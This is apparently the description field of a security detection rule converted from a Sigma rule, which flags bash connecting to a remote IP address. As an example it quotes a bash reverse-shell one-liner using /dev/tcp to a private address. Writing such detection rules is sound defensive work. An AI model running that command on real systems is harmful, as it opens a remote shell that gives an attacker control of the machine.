description: |-
  Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

  Converted from Sigma rule 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871 by zaafvesper sigma convert. Sigma author: Florian Roth (Nextron Systems).
